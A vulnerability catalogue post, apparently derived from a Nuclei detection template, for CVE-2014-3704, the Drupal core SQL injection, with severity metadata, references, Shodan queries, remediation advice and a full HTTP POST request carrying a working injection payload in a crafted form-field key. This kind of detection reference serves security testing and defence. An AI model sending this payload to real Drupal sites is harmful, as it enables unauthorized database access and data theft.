---
layout: post
cve_id: CVE-2014-3704
title: Drupal SQL Injection
pcap: true
pcap_path: /pcaps/2014/CVE-2014-3704.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2014/CVE-2014-3704.yaml
snort2_rule: N/A
snort3_rule: N/A
author: princechaddha
severity: high
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access,
  data leakage, and potential compromise of the Drupal application and its underlying
  database.

  '
remediation: Upgrade to Drupal core 7.32 or later.
reference:
- https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2014-10-15/sa-core-2014-005-drupal-core-sql
- https://nvd.nist.gov/vuln/detail/CVE-2014-3704
- https://www.drupal.org/SA-CORE-2014-005
- https://www.exploit-db.com/exploits/34984
- https://www.exploit-db.com/exploits/34992
- https://www.exploit-db.com/exploits/34993
- https://www.exploit-db.com/exploits/35150
classification:
  cvss-metrics: CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P
  cvss-score: 7.5
  cve-id: CVE-2014-3704
  cwe-id: CWE-89
  epss-score: 0.94366
  epss-percentile: 0.9996
  cpe: cpe:2.3:a:drupal:drupal:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: drupal
  product: drupal
  shodan-query:
  - http.component:"drupal"
  - cpe:"cpe:2.3:a:drupal:drupal"
tags:
- cve2014
- cve
- edb
- drupal
- sqli
- vkev
- vuln
---

## üîç Vulnerability Description
The expandArguments function in the database abstraction API in Drupal core 7.x before 7.32 does not properly construct prepared statements, which allows remote attackers to conduct SQL injection attacks via an array containing specially crafted keys.

## üåê HTTP Request
```nohighlight
POST /?q=node&destination=node HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Connection: close
Content-Length: 124
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0x23,concat(1,md5(3603)),1)%23]=bob&name[0]=a
```

